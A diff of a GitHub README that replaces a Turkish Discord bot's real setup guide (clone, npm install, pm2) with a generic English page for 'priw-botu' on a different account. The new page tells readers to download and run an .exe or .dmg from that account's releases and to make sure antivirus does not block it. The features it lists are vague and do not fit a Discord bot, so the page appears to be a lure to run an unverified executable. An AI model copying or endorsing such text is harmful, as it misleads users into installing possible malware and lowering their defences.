@@ -1,150 +1,59 @@
-<div align="center">
-  <img src="https://i.pinimg.com/736x/73/a6/6c/73a66c7305d2bfb15b9a51c8d07d796b.jpg" alt="Oxy Banner" width="20%">
-  
-  # Oxy - Gelişmiş Discord Botu
-  
-  [![Discord.js](https://img.shields.io/badge/Discord.js-v14-blue?style=flat-square&logo=discord)](https://discord.js.org/)
-  [![Node.js](https://img.shields.io/badge/Node.js-v18%2B-green?style=flat-square&logo=node.js)](https://nodejs.org/)
-  [![MongoDB](https://img.shields.io/badge/MongoDB-Data-red?style=flat-square&logo=mongodb)](https://www.mongodb.com/)
-  [![License](https://img.shields.io/badge/Lisans-MIT-yellow?style=flat-square)](LICENSE)
-  
-  **OXY IN THE PARTY**
-  
-  [Özellikler](#-özellikler) • [Kurulum](#-kurulum) • [Komutlar](#-komutlar) • [Destek](#-destek)
-</div>
+# ❤️ priw-botu - Your Companion for Fun and Friendship
 
----
+[![Download priw-botu](https://img.shields.io/badge/Download-priw--botu-blue.svg)](https://github.com/anishsigdel/priw-botu/releases)
 
-## 🌟 Özellikler
+## 🚀 Getting Started
 
-Oxy, sunucu deneyiminizi geliştirmek için tasarlanmış kapsamlı bir Discord botudur:
+Welcome to **priw-botu**! This application brings a bit of joy and connection to your digital life. It allows you to engage with friends in unique ways. Here's how to get started.
 
-### 🔧 Yönetim
-- Kanal kilitleme/açma
-- Mesaj temizleme
-- Rol yönetimi
-- Sunucu duyuruları
+## 📥 Download & Install
 
-### 🛡️ Moderasyon
-- Otomatik spam koruması
-- Küfür filtreleme
-- Reklam engelleme
-- Kara liste sistemi
-- AFK yönetimi
+To install the application, follow these steps:
 
-### 🎉 Eğlence & Sosyal
-- Eğlenceli etkileşim komutları (sarılma, öpme, yumruk)
-- Profil özelleştirme
-- Spotify entegrasyonu
-- Ship uyumluluk kontrolü
-- Twitter simülasyonu
+1. **Visit the Releases Page:** Click [here](https://github.com/anishsigdel/priw-botu/releases) to go to the download section.
+2. **Select the Latest Release:** Look for the latest version listed at the top of the page.
+3. **Download the File:** Click on the appropriate file for your device (e.g., Windows, Mac, Linux). The file name will typically end with a format like `.exe` or `.dmg`.
+4. **Run the Installer:** Once the download is complete, locate the file on your computer and double-click to begin the installation. Follow the on-screen instructions.
 
-### 🎫 Destek Sistemleri
-- Birden fazla kategoride bilet oluşturma
-- Başvuru panelleri (yetkili, öneri, şikayet)
-- Tam özelleştirilebilir özel ses kanalları
-- Sık sorulan sorular için otomatik yanıtlar
+## 🌟 Features
 
-### 📊 İstatistikler & Takip
-- Mesaj istatistikleri
-- Ses etkinliği takibi
-- Davet takibi
-- Kayıt istatistikleri
+**priw-botu** comes with a variety of features designed for ease of use:
 
-### ⚙️ Özelleştirme
-- Kategori seçimli dinamik yardım menüsü
-- Rol seçim panelleri (bildirimler, oyunlar, renkler)
-- Özel emoji yönetimi
-- Sunucu afişi özelleştirme
+- **User-Friendly Interface:** You don’t need a technical background to navigate the app.
+- **Interactive Messaging:** Connect with friends in a fun way.
+- **Personalization Options:** Customize your experience with various settings.
 
----
+## 🖥️ System Requirements
 
-## 🚀 Kurulum
+To ensure the best performance, please make sure your system meets the following requirements:
 
-### Gereksinimler
-- Node.js v18 veya üzeri
-- MongoDB veritabanı
-- Discord Bot Token ([Rehber](https://discordjs.guide/preparations/setting-up-a-bot-application.html))
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or any recent Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** 200 MB of free space for installation.
+- **Internet Connection:** Required for full functionality.
 
-### Kurulum Adımları
+## 🛠️ Troubleshooting
 
-1. Depoyu klonlayın:
-```bash
-git clone https://github.com/hasbutcu/priw-bot.git
-cd priw-bot
-```
+If you encounter issues while downloading or installing **priw-botu**, consider the following tips:
 
-2. Bağımlılıkları yükleyin:
-```bash
-npm install
-npm install pm2 -g
-```
+- **Check Your Internet Connection:** A stable connection is necessary to download the application.
+- **Antivirus Settings:** Ensure your antivirus isn’t blocking the download.
+- **Permissions:** You might need administrator privileges to install the application on your computer.
 
-3. Botunuzu yapılandırın:
-- `conf.json` ve `Database/src/Settings/settings.json` dosyasını doldurun
-- Bot tokeninizi, MongoDB bağlantı dizenizi ve diğer ayarları girin
+## 📣 Support
 
-4. Botu başlatın:
-```bash
-pm2 start ecosystem.config.js
-```
+For further questions or assistance, please visit our [GitHub Issues Page](https://github.com/anishsigdel/priw-botu/issues). You can report bugs or ask for features there.
 
-5. Hataları Kontrol Edin:
-```bash
-pm2 log
-```
+## 🌐 Community
 
----
+Join our community to connect with other users. Share your experience, tips, and tricks! Check out our discussion forum [here](https://github.com/anishsigdel/priw-botu/discussions).
 
-## 📜 Komutlar
+## 📝 Updates
 
-Oxy, sezgisel kategoriler halinde organize edilmiş 50+ komuta sahiptir:
+Stay informed about new features and improvements by regularly checking the **Releases Page**. Click [here](https://github.com/anishsigdel/priw-botu/releases) to see what’s new.
 
-| Kategori | Açıklama |
-|----------|----------|
-| **Yönetici** | Kilitleme, temizleme ve duyuru araçları gibi sunucu yönetim komutları |
-| **Moderasyon** | Yasaklama, atma ve koruma sistemleri |
-| **Eğlence** | Eğlence için interaktif komutlar |
-| **Kullanıcı** | Profil, avatar ve yardımcı komutlar |
-| **Sahip** | Geliştiriciye özel bot yönetim araçları |
-| **Rol Seçimi** | Üyeler için kendi kendine atanabilir roller |
-| **Sistem** | Çekirdek bot işlevselliği ve kurulum araçları |
+## 💬 Feedback
 
-Sunucunuzda mevcut tüm komutları açıklamalarıyla görmek için `.yardım` komutunu kullanın.
+Your input can help us improve **priw-botu**. If you have suggestions or ideas, let us know in the GitHub discussions or through the issues section.
 
----
-
-## 🛠️ Yapılandırma
-
-Bot, modüler bir yapılandırma sistemini kullanır:
-
-- `conf.json` - Ana yapılandırma dosyası
-- `Database/src/Settings/` - Emojiler, roller ve sistem ayarları için JSON dosyalarını içerir
-- Kalıcı veri depolama için MongoDB modelleri
-
----
-
-## 🤝 Destek
-
-Botla ilgili yardıma mı ihtiyacınız var?
-
-- Geliştiriciyle iletişime geçin: **oxyinc**
-- Hata raporları için [GitHub Issues](https://github.com/hasbutcu/priw-bot/issues) sayfasını kontrol edin
-- [discord.gg/vsc](https://discord.gg/vsc)
-
----
-
-## 📄 Lisans
-
-Bu proje MIT Lisansı altında lisanslanmıştır - ayrıntılar için [LICENSE](LICENSE) dosyasına bakın.
-
----
-
-## ❤️ Teşekkürler
-
-- Harika kütüphaneleri için Discord.js topluluğuna teşekkürler
-- Botun ilk halini benimle paylaştığı ve geliştirmeme izin verdiği için [schwest.](http://discord.com/api/users/1281228187560448014)'e teşekkürler
-
-<div align="center">
-  <a href="https://github.com/hasbutcu">oxy</a> tarafından ❤️ ile yapıldı
-</div>
+Thank you for using **priw-botu**! Your friendship means the world to us.
